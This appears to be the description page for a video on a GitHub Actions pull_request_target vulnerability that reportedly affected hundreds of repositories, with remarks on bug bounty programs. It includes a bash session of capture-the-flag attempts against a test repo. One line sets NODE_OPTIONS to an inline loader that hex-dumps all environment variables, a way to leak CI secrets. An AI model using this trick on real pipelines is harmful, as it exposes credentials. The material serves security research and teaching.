# [github actions vulnerability or "why bug bounties are a scam" (intermediate)](https://youtu.be/_fpXyS_i1xE)

Today I talk about a vulnerability I found in github actions involving the `pull_request_target` feature and how it escalates to credential access / full repository access.  I found over ~350 vulnerable repositories including ones owned by google, amazon, microsoft, alibabi, psf and more and document my experience (or lack thereof) with bug bounty programs.

## Interactive examples

### Bash

```bash
git clone git@github.com:<username>/gha-test
# git clone https://github.com/<username>/gha-test
cd gha-test
ls

git checkout origin/main -b ctf1
git status
git add -u
git commit -m 'capture flag 1: attempt 1'
git push origin HEAD

chmod +x t.sh
git add .
git status
git commit -m 'expose secret attempt 1'
git push origin HEAD

git status
git add -u
git commit -m 'capture it as base64'
git push origin HEAD

git add t.sh
git status
git commit -m 'hex dump instead?'
git push origin HEAD

export NODE_OPTIONS="--experimental-modules --experimental-loader=data:text/javascript,console.log(Buffer.from(JSON.stringify(process.env)).toString('hex'));//"
fc
node
env

git checkout origin/main -b ctf2
chmod +x t.sh
git add Makefile
git add t.sh
git status
git commit -m 'attempt to capture flag 2'
git push origin HEAD
```
